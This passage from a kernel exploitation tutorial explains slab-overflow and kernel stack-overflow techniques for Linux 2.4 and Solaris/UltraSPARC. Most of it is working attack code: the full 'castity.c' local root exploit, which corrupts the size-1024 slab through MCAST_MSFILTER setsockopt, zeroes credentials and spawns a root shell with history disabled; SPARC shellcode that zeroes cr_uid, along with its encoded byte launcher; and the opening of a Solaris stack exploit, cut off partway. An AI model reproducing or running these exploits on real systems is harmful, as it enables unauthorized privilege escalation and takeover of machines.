Since the copy_from_user at [3] happens _before_ the check at [4], we were
able to create a sequence of 1024-sized objects by repeatedly issuing a
failing (at [4]) 'setsockopt', thus obtaining a large-enough one. 

Hoping to make it clearer let's sum up the steps :        

  - fill the 1024 slabs so that at next allocation a fresh one is returned 
  - alloc the first object of the new 1024-slab.
  - use as many 'failing' setsockopt as needed to copy values inside
    objects 2 and 3 [and 4, if needed, not the usual case thou] 
  - free the first object 
  - use a smaller (but still 1024-slab allocation driving) value for
    optlen that would pass the check at [4] 

At that point the gsf pointer points to the first object inside our
freshly created slab. Objects 2 and 3 haven't been re-used yet, so still
contains our data. Since the objects inside the slab are adiacent we have
a de-facto larger (and large enough) gsf struct to reach the 'shm_file'
pointer. 

Last note, to reliably fill the slabs we check /proc/slabinfo. 
The exploit, called castity.c, was written when the advisory went out, and
is only for 2.4.* kernels (the sys_epoll vulnerability [12] was more than 
enough for 2.6.* ones ;) )

Exploit follows, just without the initial header, since the approach has
been already extensively explained above.
    
< stuff/expl/linux/castity.c >

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

#define __u32           unsigned int
#define MCAST_MSFILTER  48
#define SOL_IP          0
#define SIZE            4096
#define R_FILE          "/etc/passwd"    // Set it to whatever file you
can read. It's just for 1024 filling.

struct in_addr {
   unsigned int   s_addr;
};

#define __SOCK_SIZE__   16

struct sockaddr_in {
  unsigned short        sin_family;     /* Address family               */
  unsigned short int    sin_port;       /* Port number                  */
  struct in_addr        sin_addr;       /* Internet address             */

  /* Pad to size of `struct sockaddr'. */
  unsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct
in_addr)];
};

struct group_filter
{
        __u32                   gf_interface;   /* interface index */
        struct sockaddr_storage gf_group;       /* multicast address */
        __u32                   gf_fmode;       /* filter mode */
        __u32                   gf_numsrc;      /* number of sources */
        struct sockaddr_storage gf_slist[1];    /* interface index */
};

struct  damn_inode      {
        void            *a, *b;
        void            *c, *d;
        void            *e, *f;
        void            *i, *l;
        unsigned long   size[40];  // Yes, somewhere here :-)
} le;


struct  dentry_suck     {
        unsigned int    count, flags;
        void            *inode;
        void            *dd;
} fucking = { 0xbad, 0xbad, &le, NULL };

struct  fops_rox        {
        void            *a, *b, *c, *d, *e, *f, *g;
        void            *mmap;
        void            *h, *i, *l, *m, *n, *o, *p, *q, *r;
        void            *get_unmapped_area;
} chien;



struct  file_fuck       {
        void            *prev, *next;
        void            *dentry;
        void            *mnt;
        void            *fop;
} gagne = { NULL, NULL, &fucking, NULL, &chien };



static char     stack[16384];

int             gotsig = 0,
                fillup_1024 = 0,
                fillup_64 = 0,
                uid, gid;

int             *pid, *shmid;



static void sigusr(int b)
{
        gotsig = 1;
}

void fatal (char *str)
{
        fprintf(stderr, "[-] %s\n", str);
        exit(EXIT_FAILURE);
}

#define BUFSIZE 256

int calculate_slaboff(char *name)
{
        FILE *fp;
        char slab[BUFSIZE], line[BUFSIZE];
        int ret;
        /* UP case */
        int active_obj, total;

        bzero(slab, BUFSIZE);
        bzero(line, BUFSIZE);

        fp = fopen("/proc/slabinfo", "r");
        if ( fp == NULL )
                fatal("error opening /proc for slabinfo");

        fgets(slab, sizeof(slab) - 1, fp);
        do {
                ret = 0;
                if (!fgets(line, sizeof(line) - 1, fp))
                        break;
                ret = sscanf(line, "%s %u %u", slab, &active_obj, &total);
        } while (strcmp(slab, name));

        close(fileno(fp));
        fclose(fp);

        return ret == 3 ? total - active_obj : -1;

}

int populate_1024_slab()
{
        int fd[252];
        int i;

        signal(SIGUSR1, sigusr);

        for ( i = 0; i < 252 ; i++)
                fd[i] = open(R_FILE, O_RDONLY);

        while (!gotsig)
                pause();
        gotsig = 0;

        for ( i = 0; i < 252; i++)
                close(fd[i]);

}


int kernel_code()
{
        int i, c;
        int *v;

        __asm__("movl   %%esp, %0" : : "m" (c));

        c &= 0xffffe000;
         v = (void *) c;


        for (i = 0; i < 4096 / sizeof(*v) - 1; i++) {
                if (v[i] == uid && v[i+1] == uid) {
                        i++; v[i++] = 0; v[i++] = 0; v[i++] = 0;
                }
                if (v[i] == gid) {
                        v[i++] = 0; v[i++] = 0; v[i++] = 0; v[i++] = 0;
                        return -1;
                }
        }

        return -1;
}




void    prepare_evil_file ()
{
        int i = 0;

        chien.mmap = &kernel_code ;   // just to pass do_mmap_pgoff check
        chien.get_unmapped_area = &kernel_code;

        /*
         * First time i run the exploit i was using a precise offset for
         * size, and i calculated it _wrong_. Since then my lazyness took
	 * over and i use that ""very clean"" *g* approach.
         * Why i'm telling you ? It's 3 a.m., i don't find any better than
         * writing blubbish comments
         */

        for ( i = 0; i < 40; i++)
                le.size[i] = SIZE;

}

#define SEQ_MULTIPLIER  32768

void    prepare_evil_gf ( struct group_filter *gf, int id )
{
        int                     filling_space = 64 - 4 * sizeof(int);
        int                     i = 0;
        struct sockaddr_in      *sin;

        filling_space /= 4;

        for ( i = 0; i < filling_space; i++ )
        {
              sin = (struct sockaddr_in *)&gf->gf_slist[i];
              sin->sin_family = AF_INET;
              sin->sin_addr.s_addr = 0x41414141;
        }

        /* Emulation of struct kern_ipc_perm */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = IPC_PRIVATE;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = uid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = gid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = uid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = gid;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = -1;

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = id/SEQ_MULTIPLIER;

        /* evil struct file address */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = AF_INET;
        sin->sin_addr.s_addr = (unsigned long)&gagne;

        /* that will stop mcast loop */

        sin = (struct sockaddr_in *)&gf->gf_slist[i++];
        sin->sin_family = 0xbad;
        sin->sin_addr.s_addr = 0xdeadbeef;

        return;

}

void    cleanup ()
{
        int                     i = 0;
        struct shmid_ds         s;

        for ( i = 0; i < fillup_1024; i++ )
        {
                kill(pid[i], SIGUSR1);
                waitpid(pid[i], NULL, __WCLONE);
        }

        for ( i = 0; i < fillup_64 - 2; i++ )
                shmctl(shmid[i], IPC_RMID, &s);

}


#define EVIL_GAP        4
#define SLAB_1024       "size-1024"
#define SLAB_64         "size-64"
#define OVF             21
#define CHUNKS          1024
#define LOOP_VAL        0x4000000f
#define CHIEN_VAL       0x4000000b

main()
{
        int                     sockfd, ret, i;
        unsigned int            true_alloc_size, last_alloc_chunk, loops;
        char                    *buffer;
        struct group_filter     *gf;
        struct shmid_ds         s;

        char    *argv[] = { "le-chien", NULL };
        char    *envp[] = { "TERM=linux", "PS1=le-chien\\$",
"BASH_HISTORY=/dev/null", "HISTORY=/dev/null", "history=/dev/null",
"PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
"HISTFILE=/dev/null", NULL };


        true_alloc_size = sizeof(struct group_filter) - sizeof(struct
sockaddr_storage) + sizeof(struct sockaddr_storage) * OVF;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        uid = getuid();
        gid = getgid();

        gf = malloc (true_alloc_size);
        if ( gf == NULL )
                fatal("Malloc failure\n");

        gf->gf_interface = 0;
        gf->gf_group.ss_family = AF_INET;

        fillup_64 = calculate_slaboff(SLAB_64);

        if ( fillup_64 == -1 )
                fatal("Error calculating slab fillup\n");

        printf("[+] Slab %s fillup is %d\n", SLAB_64, fillup_64);

        /* Yes, two would be enough, but we have that "sexy" #define, why
don't use it ? :-) */

        fillup_64 += EVIL_GAP;

        shmid = malloc(fillup_64 * sizeof(int));
        if ( shmid == NULL )
                fatal("Malloc failure\n");

        /* Filling up the size-64 and obtaining a new page with EVIL_GAP
entries */

        for ( i = 0; i < fillup_64; i++ )
                shmid[i] = shmget(IPC_PRIVATE, 4096, IPC_CREAT|SHM_R);

        prepare_evil_file();
        prepare_evil_gf(gf, shmid[fillup_64 - 1]);

        buffer = (char *)gf;

        fillup_1024 = calculate_slaboff(SLAB_1024);
        if ( fillup_1024 == -1 )
                fatal("Error calculating slab fillup\n");

        printf("[+] Slab %s fillup is %d\n", SLAB_1024, fillup_1024);

        fillup_1024 += EVIL_GAP;


        pid = malloc(fillup_1024 * sizeof(int));
        if (pid  == NULL )
                fatal("Malloc failure\n");

        for ( i = 0; i < fillup_1024; i++)
                pid[i] = clone(populate_1024_slab, stack + sizeof(stack) -
4, 0, NULL);

        printf("[+] Attempting to trash size-1024 slab\n");

        /* Here starts the loop trashing size-1024 slab */

        last_alloc_chunk = true_alloc_size % CHUNKS;
        loops = true_alloc_size / CHUNKS;

        gf->gf_numsrc = LOOP_VAL;

        printf("[+] Last size-1024 chunk is of size %d\n",
last_alloc_chunk);
        printf("[+] Looping for %d chunks\n", loops);

        kill(pid[--fillup_1024], SIGUSR1);
        waitpid(pid[fillup_1024], NULL, __WCLONE);

        if ( last_alloc_chunk > 512  )
                ret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer +
loops * CHUNKS, last_alloc_chunk);
        else

        /*
         * Should never happen. If it happens it probably means that we've
         * bigger datatypes (or slab-size), so probably
         * there's something more to "fix me". The while loop below is
         * already okay for the eventual fixing ;)
         */
  
              fatal("Last alloc chunk fix me\n");

        while ( loops > 1 )
        {
                kill(pid[--fillup_1024], SIGUSR1);
                waitpid(pid[fillup_1024], NULL, __WCLONE);

                ret = setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer +
--loops * CHUNKS, CHUNKS);
        }

        /* Let's the real fun begin */

        gf->gf_numsrc = CHIEN_VAL;

        kill(pid[--fillup_1024], SIGUSR1);
        waitpid(pid[fillup_1024], NULL, __WCLONE);

        shmctl(shmid[fillup_64 - 2], IPC_RMID, &s);
        setsockopt(sockfd, SOL_IP, MCAST_MSFILTER, buffer, CHUNKS);

        cleanup();

        ret = (unsigned long)shmat(shmid[fillup_64 - 1], NULL,
SHM_RDONLY);


        if ( ret == -1)
        {
                printf("Le Fucking Chien GAGNE!!!!!!!\n");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                execve("/bin/sh", argv, envp);
                exit(0);
        }

        printf("Here we are, something sucked :/ (if not L1_cache too big,
probably slab align, retry)\n" );

}
   
< / > 


------[ 2.3 - Stack overflow vulnerabilities


When a process is in 'kernel mode' it has a stack which is different from
the stack it uses at userland. We'll call it 'kernel stack'. 
That kernel stack is usually limited in size to a couple of pages (on
Linux, for example, it is 2 pages, 8kb, but an option at compile time 
exist to have it limited at one page) and is not a surprise that a common
design practice in kernel code developing is to use locally to a function
as little stack space as possible.

At a first glance, we can imagine two different scenarios that could go
under the name of 'stack overflow vulnerabilities' :

 - 'standard' stack overflow vulnerability : a write past a buffer on the
   stack overwrites the saved instruction pointer or the frame pointer
   (Solaris only, Linux is compiled with -fomit-frame-pointer) or some
   variable (usually a pointer) also located in the stack. 

 - 'stack size overflow' : a deeply nested callgraph goes further the
   alloc'ed stack space.  

Stack based explotation is more architectural and o.s. specific than the
already presented slab based one.
That is due to the fact that once the stack is trashed we achieve
execution flow hijack, but then we must find a way to somehow return to
userland. We con't cover here the details of x86 architecture, since those
have been already very well explained by noir in his phrack60 paper [13]. 

We will instead focus on the UltraSPARC architecture and on its more
common operating system, Solaris. The next subsection will describe the
relevant details of it and will present a technique which is suitable
aswell for the exploiting of slab based overflow (or, more generally,
whatever 'controlled flow redirection' vulnerability). 

The AMD64 architecture won't be covered yet, since it will be our 'example
architecture' for the next kind of vulnerabilities (race condition). The
sendmsg [5] exploit proposed later on is, at the end, a stack based one.

Just before going on with the UltraSPARC section we'll just spend a couple
of words describing the return-to-ring3 needs on an x86 architecture and
the Linux use of the kernel stack (since it quite differs from the Solaris
one). 

Linux packs together the stack and the struct associated to every process
in the system (on Linux 2.4 it was directly the task_struct, on Linux 2.6
it is the thread_info one, which is way smaller and keeps inside a pointer
to the task_struct). This memory area is, by default, 8 Kb (a kernel
option exist to have it limited to 4 Kb), that is the size of two pages,
which are allocated consecutively and with the first one aligned to a 2^13
multiple. The address of the thread_struct (or of the task_struct) is thus
calculable at runtime by masking out the 13 least significant bits of the
Kernel Stack (%esp).  

The stack starts at the bottom of this page and 'grows' towards the top,
where the thread_info (or the task_struct) is located. To prevent the
'second' type of overflow when the 4 Kb Kernel Stack is selected at
compile time, the kernel uses two adjunctive per-CPU stacks, one for
interrupt handling and one for softirq and tasklets functions, both one
page sized. 

It is obviously on the stack that Linux stores all the information to
return from exceptions, interrupts or function calls and, logically, to 
get back to ring3, for example by means of the iret instruction. 
If we want to use the 'iret' instruction inside our shellcodes to get out
cleanly from kernel land we have to prepare a fake stack frame as it
expects to find.

We have to supply:
  - a valid user space stack pointer
  - a valid user space instruction pointer
  - a valid EFLAGS saved EFLAGS register
  - a valid User Code Segment
  - a valid User Stack Segment

 LOWER ADDRESS
 +-----------------+
 |                 |
 |   User SS       | -+
 |   User ESP      |  |
 |   EFLAGS        |  |  Fake Iret Frame
 |   User CS       |  |
 |   User EIP      | -+  <----- current kernel stack pointer (ESP)
 |                 |
 +-----------------+
 
We've added a demonstrative stack based exploit (for the Linux dummy 
driver) which implements a shellcode doing that recovery-approach :

  movl   $0x7b,0x10(%esp)       // user stack segment (SS)
  movl   $stack_chunk,0xc(%esp) // user stack pointer (ESP)
  movl   $0x246,0x8(%esp)       // valid EFLAGS saved register
  movl   $0x73,0x4(%esp)        // user code segment (CS)
  movl   $code_chunk,0x0(%esp)  // user code pointer  (EIP)
  iret

You can find it in < expl/linux/stack_based.c > 


---[ 2.3.1 - UltraSPARC exploiting


The UltraSPARC [14] is a full implementation of the SPARC V9 64-bit [2] 
architecture. The most 'interesting' part of it from an exploiting
perspective is the support it gives to the operating system for a fully
separated address space among userspace and kernelspace.

This is achieved through the use of context registers and address space
identifiers 'ASI'. The UltraSPARC MMU provides two settable context
registers, the primary (PContext) and the secondary (SContext) one. One
more context register hardwired to zero is provided, which is the nucleus
context ('context' 0 is where the kernel lives).
To every process address space is associated a 'context value', which is
set inside the PContext register during process execution. This value is
used to perform memory addresses translation. 

Every time a process issues a trap instruction to access kernel land (for
example ta 0x8 or ta 0x40, which is how system call are implemented on
Solaris 10), the nucleus context is set as default. The process context
value (as recorded inside PContext) is then moved to SContext, while the
nucleus context becomes the 'primary context'. 

At that point the kernel code can access directly the userland by
specifying the correct ASI to a load or store alternate instruction
(instructions that support a direct asi immediate specified - lda/sta). 
Address Space Identifiers (ASIs) basically specify how those instruction
have to behave :

< usr/src/uts/sparc/v9/sys/asi.h >

#define ASI_N                   0x04    /* nucleus */
#define ASI_NL                  0x0C    /* nucleus little */
#define ASI_AIUP                0x10    /* as if user primary */
#define ASI_AIUS                0x11    /* as if user secondary */
#define ASI_AIUPL               0x18    /* as if user primary little */
#define ASI_AIUSL               0x19    /* as if user secondary little */

[...]

#define ASI_USER        ASI_AIUS

< / > 

Theese are ASI that are specified by the SPARC v9 reference (more ASI are
machine dependant and let modify, for example, MMU or other hardware
registers, check usr/src/uts/sun4u/sys/machasi.h), the 'little' version is
just used to specify a byte ordering access different from the 'standard'
big endian one (SPARC v9 can access data in both formats).

The ASI_USER is the one used to access, from kernel land, the user space. 
An instruction like :

       ldxa [addr]ASI_USER, %l1 

would just load the double word stored at 'addr', relative to the address
space contex stored in the SContext register, 'as if' it was accessed by
userland code (so with all protection checks). 

It is thus possible, if able to start executing a minimal stub of code, to
copy bytes from the userland wherever we want at kernel land.  

But how do we execute code at first ? Or, to make it even more clearer,
where do we return once we have performed our (slab/stack) overflow and
hijacked the instruction pointer ? 

To complicate things a little more, the UltraSPARC architecture implements
the execution bit permission over TTEs (Translation Table Entry, which are
the TLB entries used to perform virtual/physical translations). 

It is time to give a look at Solaris Kernel implementation to find a
solution. The technique we're going to present now (as you'll quickly
figure out) is not limited to stack based exploiting, but can be used
every time you're able to redirect to an arbitrary address the instruction 
flow at kernel land.


---] 2.3.2 - A reliable Solaris/UltraSPARC exploit


The Solaris process model is slightly different from the Linux one. The
foundamental unit of scheduling is the 'kernel thread' (described by the
kthread_t structure), so one has to be associated to every existing LWP 
(light-weight process) in a process.
LWPs are just kernel objects which represent the 'kernel state' of every
'user thread' inside a process and thus let each one enter the kernel
indipendently (without LWPs, user thread would contend at system call).

The information relative to a 'running process' are so scattered among
different structures. Let's see what we can make out of them. 
Every Operating System (and Solaris doesn't differ) has a way to quickly
get the 'current running process'. On Solaris it is the 'current kernel
thread' and it's obtained, on UltraSPARC, by :

#define curthread       (threadp())  

< usr/src/uts/sparc/ml/sparc.il >

! return current thread pointer

        .inline threadp,0
        .register %g7, #scratch
        mov     %g7, %o0
        .end

< / > 

It is thus stored inside the %g7 global register. 
From the kthread_t struct we can access all the other 'process related'
structs. Since our main purpose is to raise privileges we're interested in
where the Solaris kernel stores process credentials. 

Those are saved inside the cred_t structure pointed to by the proc_t one :

# mdb -k
Loading modules: [ unix krtld genunix ip usba nfs random ptm ]
> ::ps ! grep snmpdx
R    278      1    278    278     0 0x00010008 0000030000e67488 snmpdx
> 0000030000e67488::print proc_t
{
    p_exec = 0x30000e5b5a8
    p_as = 0x300008bae48
    p_lockp = 0x300006167c0
    p_crlock = {
        _opaque = [ 0 ]
    }
    p_cred = 0x3000026df28
[...]
> 0x3000026df28::print cred_t
{
    cr_ref = 0x67b
    cr_uid = 0
    cr_gid = 0
    cr_ruid = 0
    cr_rgid = 0
    cr_suid = 0
    cr_sgid = 0
    cr_ngroups = 0
    cr_groups = [ 0 ]
}
> ::offsetof proc_t p_cred
offsetof (proc_t, p_cred) = 0x20
> ::quit

#

The '::ps' dcmd ouput introduces a very interesting feature of the Solaris
Operating System, which is a god-send for exploiting.
The address of the proc_t structure in kernel land is exported to
userland : 

bash-2.05$ ps -aef -o addr,comm | grep snmpdx
     30000e67488 /usr/lib/snmp/snmpdx
bash-2.05$

At a first glance that could seem of not great help, since, as we said, 
the kthread_t struct keeps a pointer to the related proc_t one :

> ::offsetof kthread_t t_procp
offsetof (kthread_t, t_procp) = 0x118
> ::ps ! grep snmpdx
R    278      1    278    278     0 0x00010008 0000030000e67488 snmpdx
> 0000030000e67488::print proc_t p_tlist
p_tlist = 0x30000e52800
> 0x30000e52800::print kthread_t t_procp
t_procp = 0x30000e67488
>

To understand more precisely why the exported address is so important we
have to take a deeper look at the proc_t structure. 
This structure contains the user_t struct, which keeps information like
the program name, its argc/argv value, etc : 

> 0000030000e67488::print proc_t p_user
[...]
    p_user.u_ticks = 0x95c
    p_user.u_comm = [ "snmpdx" ]
    p_user.u_psargs = [ "/usr/lib/snmp/snmpdx -y -c /etc/snmp/conf" ]
    p_user.u_argc = 0x4
    p_user.u_argv = 0xffbffcfc
    p_user.u_envp = 0xffbffd10
    p_user.u_cdir = 0x3000063fd40
[...]

We can control many of those. 
Even more important, the pages that contains the process_cache (and thus
the user_t struct), are not marked no-exec, so we can execute from there
(for example the kernel stack, allocated from the seg_kp [kernel pageable
memory] segment, is not executable). 

Let's see how 'u_psargs' is declared :

< usr/src/common/sys/user.h >
#define PSARGSZ         80      /* Space for exec arguments (used by
ps(1)) */
#define MAXCOMLEN       16      /* <= MAXNAMLEN, >= sizeof (ac_comm) */

[...]

typedef struct  user {
        /*
         * These fields are initialized at process creation time and never
         * modified.  They can be accessed without acquiring locks.
         */
        struct execsw *u_execsw;        /* pointer to exec switch entry */
        auxv_t  u_auxv[__KERN_NAUXV_IMPL]; /* aux vector from exec */
        timestruc_t u_start;            /* hrestime at process start */
        clock_t u_ticks;                /* lbolt at process start */
        char    u_comm[MAXCOMLEN + 1];  /* executable file name from exec
*/
        char    u_psargs[PSARGSZ];      /* arguments from exec */
        int     u_argc;                 /* value of argc passed to main()
*/
        uintptr_t u_argv;               /* value of argv passed to main()
*/
        uintptr_t u_envp;               /* value of envp passed to main()
*/
  
[...]

< / >

The idea is simple : we put our shellcode on the command line of our
exploit (without 'zeros') and we calculate from the exported proc_t
address the exact return address.
This is enough to exploit all those situations where we have control of
the execution flow _without_ trashing the stack (function pointer
overwriting, slab overflow, etc). 

We have to remember to take care of the alignment, thou, since the
UltraSPARC fetch unit raises an exception if the address it reads the
instruction from is not aligned on a 4 bytes boundary (which is the size
of every sparc instruction) :

> ::offsetof proc_t p_user
offsetof (proc_t, p_user) = 0x330
> ::offsetof user_t u_psargs
offsetof (user_t, u_psargs) = 0x161
>

Since the proc_t taken from the 'process cache' is always aligned to an 8
byte boundary, we have to jump 3 bytes after the starting of the u_psargs
char array (which is where we'll put our shellcode).  
That means that we have space for 76 / 4 = 19 instructions, which is
usually enough for average shellcodes.. but space is not really a limit
since we can 'chain' more psargs struct from different processes, simply
jumping from each others. Moreover we could write a two stage shellcode
that would just start copying over our larger one from the userland using
the load from alternate space instructions presented before. 

We're now facing a slightly more complex scenario, thou, which is the
'kernel stack overflow'. We assume here that you're somehow familiar with
userland stack based exploiting (if you're not you can check [15] and
[16]). 
The main problem here is that we have to find a way to safely return to
userland once trashed the stack (and so, to reach the instruction pointer,
the frame pointer). A good way to understand how the 'kernel stack' is
used to return to userland is to follow the path of a system call. 
You can get a quite good primer here [17], but we think that a read
through opensolaris sources is way better (you'll see also, following the
sys_trap entry in uts/sun4u/ml/mach_locore.s, the code setting the nucleus
context as the PContext register). 

Let's focus on the 'kernel stack' usage : 

< usr/src/uts/sun4u/ml/mach_locore.s >

        ALTENTRY(user_trap)
        !
        ! user trap
        !
        ! make all windows clean for kernel
        ! buy a window using the current thread's stack
        !
        sethi   %hi(nwin_minus_one), %g5
        ld      [%g5 + %lo(nwin_minus_one)], %g5
        wrpr    %g0, %g5, %cleanwin
        CPU_ADDR(%g5, %g6)
        ldn     [%g5 + CPU_THREAD], %g5
        ldn     [%g5 + T_STACK], %g6
        sub     %g6, STACK_BIAS, %g6
        save    %g6, 0, %sp
  
< / > 

In %g5 is saved the number of windows that are 'implemented' in the
architecture minus one, which is, in that case, 8 - 1 = 7.
CLEANWIN is set to that value since there are no windows in use out of the
current one, and so the kernel has 7 free windows to use. 

The cpu_t struct addr is then saved in %g5 (by CPU_ADDR) and, from there,
the thread pointer [ cpu_t->cpu_thread ] is obtained. 
From the kthread_t struct is obtained the 'kernel stack address' [the
member name is called t_stk]. This one is a good news, since that member
is easy accessible from within a shellcode (it's just a matter of
correctly accessing the %g7 / thread pointer). From now on we can follow
the sys_trap path and we'll be able to figure out what we will find on the
stack just after the kthread_t->t_stk value and where. 

To that value is then subtracted 'STACK_BIAS' : the 64-bit v9 SPARC ABI
specifies that the %fp and %sp register are offset by a constant, the
stack bias, which is 2047 bits. This is one thing that we've to remember
while writing our 'stack fixup' shellcode. 
On 32-bit running kernels the value of this constant is 0. 

The save below is another good news, because that means that we can use
the t_stk value as a %fp (along with the 'right return address') to return
at 'some valid point' inside the syscall path (and thus let it flow from
there and cleanily get back to userspace). 

The question now is : at which point ? Do we have to 'hardcode' that
return address or we can somehow gather it ? 

A further look at the syscall path reveals that :

        ENTRY_NP(utl0)
        SAVE_GLOBALS(%l7)
        SAVE_OUTS(%l7)
        mov     %l6, THREAD_REG
        wrpr    %g0, PSTATE_KERN, %pstate       ! enable ints
        jmpl    %l3, %o7                        ! call trap handler
        mov     %l7, %o0

And, that %l3 is : 

have_win:
        SYSTRAP_TRACE(%o1, %o2, %o3)


        !
        ! at this point we have a new window we can play in,
        ! and %g6 is the label we want done to bounce to
        !
        ! save needed current globals
        !
        mov     %g1, %l3        ! pc
        mov     %g2, %o1        ! arg #1
        mov     %g3, %o2        ! arg #2
        srlx    %g3, 32, %o3    ! pseudo arg #3
        srlx    %g2, 32, %o4    ! pseudo arg #4
 
%g1 was preserved since : 

#define SYSCALL(which)                  \
        TT_TRACE(trace_gen)             ;\
        set     (which), %g1            ;\
        ba,pt   %xcc, sys_trap          ;\
        sub     %g0, 1, %g4             ;\
        .align  32

and so it is syscall_trap for LP64 syscall and syscall_trap32 for ILP32
syscall. Let's check if the stack layout is the one we expect to find :

> ::ps ! grep snmp
R    291      1    291    291     0 0x00020008 0000030000db4060 snmpXdmid
R    278      1    278    278     0 0x00010008 0000030000d2f488 snmpdx
> ::ps ! grep snmpdx
R    278      1    278    278     0 0x00010008 0000030000d2f488 snmpdx
> 0000030000d2f488::print proc_t p_tlist
p_tlist = 0x30001dd4800
> 0x30001dd4800::print kthread_t t_stk
t_stk = 0x2a100497af0 ""
> 0x2a100497af0,16/K
0x2a100497af0:  1007374         2a100497ba0     30001dd2048     1038a3c
                1449e10         0               30001dd4800
                2a100497ba0     ffbff700        3               3a980
                0               3a980           0
                ffbff6a0        ff1525f0        0               0
                0               0               0
                0
> syscall_trap32=X
                1038a3c
>
  
Analyzing the 'stack frame' we see that the saved %l6 is exactly
THREAD_REG (the thread value, 30001dd4800) and %l3 is 1038a3c, the
syscall_trap32 address. 

At that point we're ready to write our 'shellcode' : 

# cat sparc_stack_fixup64.s

.globl begin
.globl end

begin:
        ldx [%g7+0x118], %l0
        ldx [%l0+0x20], %l1
        st %g0, [%l1 + 4]
        ldx [%g7+8], %fp
        ldx [%fp+0x18], %i7
        sub %fp,2047,%fp
        add 0xa8, %i7, %i7

        ret
        restore
end:
#

At that point it should be quite readable : it gets the t_procp address
from the kthread_t struct and from there it gets the p_cred addr.
It then sets to zero (the %g0 register is hardwired to zero) the cr_uid
member of the cred_t struct and uses the kthread_t->t_stk value to set
%fp. %fp is then dereferenced to get the 'syscall_trap32' address and the
STACK_BIAS subtraction is then performed. 

The add 0xa8 is the only hardcoded value, and it's the 'return place'
inside syscall_trap32. You can quickly derive it from a ::findstack dcmd
with mdb. A more advanced shellcode could avoid this 'hardcoded value' by
opcode scanning from the start of the syscall_trap32 function and looking
for the jmpl %reg,%o7/nop sequence (syscall_trap32 doesn't get a new
window, and stays in the one sys_trap had created) pattern. 
On all the boxes we tested it was always 0xa8, that's why we just left it
hardcoded. 

As we said, we need the shellcode to be into the command line, 'shifted' 
of 3 bytes to obtain the correct alignment. To achieve that a simple
launcher code was used :

bash-2.05$ cat launcer_stack.c
#include <unistd.h>

char sc[] = "\x66\x66\x66"              // padding for alignment
"\xe0\x59\xe1\x18\xe2\x5c\x20\x20\xc0\x24\x60\x04\xfc\x59\xe0"
"\x08\xfe\x5f\xa0\x18\xbc\x27\xa7\xff\xbe\x07\xe0\xa8\x81"
"\xc7\xe0\x08\x81\xe8\x00\x00";

int main()
{
        execl("e", sc, NULL);
        return 0;
}
bash-2.05$

The shellcode is the one presented before. 

Before showing the exploit code, let's just paste the vulnerable code,
from the dummy driver provided for Solaris :

< stuff/drivers/solaris/test.c >

[...]

static int handle_stack (intptr_t arg)
{
        char buf[32];
        struct test_comunique t_c;

        ddi_copyin((void *)arg, &t_c, sizeof(struct test_comunique), 0);

        cmn_err(CE_CONT, "Requested to copy over buf %d bytes from %p\n",
t_c.size, &buf);

        ddi_copyin((void *)t_c.addr, buf, t_c.size, 0); [1]

        return 0;
}

static int test_ioctl (dev_t dev, int cmd, intptr_t arg, int mode,
                        cred_t *cred_p, int *rval_p )
{
    cmn_err(CE_CONT, "ioctl called : cred %d %d\n", cred_p->cr_uid,
cred_p->cr_gid);

    switch ( cmd )
    {
        case TEST_STACKOVF: {
        	handle_stack(arg);
	}

[...]

< / > 

The vulnerability is quite self explanatory and is a lack of 'input
sanitizing' before calling the ddi_copyin at [1]. 

Exploit follows :

< stuff/expl/solaris/e_stack.c >

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "test.h"

#define BUFSIZ 192

char buf[192];

typedef struct psinfo {
        int     pr_flag;        /* process flags */
        int     pr_nlwp;        /* number of lwps in process */
        pid_t   pr_pid;         /* unique process id */
        pid_t   pr_ppid;        /* process id of parent */
        pid_t   pr_pgid;        /* pid of process group leader */
        pid_t   pr_sid;         /* session id */
        uid_t   pr_uid;         /* real user id */
        uid_t   pr_euid;        /* effective user id */
        gid_t   pr_gid;         /* real group id */
        gid_t   pr_egid;        /* effective group id */
        uintptr_t pr_addr;      /* address of process */
        size_t  pr_size;        /* size of process image in Kbytes */
} psinfo_t;

#define ALIGNPAD        3

#define PSINFO_PATH     "/proc/self/psinfo"

unsigned long getaddr()
{
        psinfo_t        info;
        int             fd;

        fd = open(PSINFO_PATH, O_RDONLY);
        if ( fd == -1)
        {
                perror("open");
                return -1;
        }

        read(fd, (char *)&info, sizeof (info));
        close(fd);
        return info.pr_addr;
}
 

#define UPSARGS_OFFSET 0x330 + 0x161

int exploit_me()
{
        char    *argv[] = { "princess", NULL };
        char    *envp[] = { "TERM=vt100", "BASH_HISTORY=/dev/null",
"HISTORY=/dev/null", "history=/dev/null",
     "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
"HISTFILE=/dev/null", NULL };

         printf("Pleased to see you, my Princess\n");
         setreuid(0, 0);
         setregid(0, 0);
         execve("/bin/sh", argv, envp);
         exit(0);

}

#define SAFE_FP     0x0000000001800040 + 1
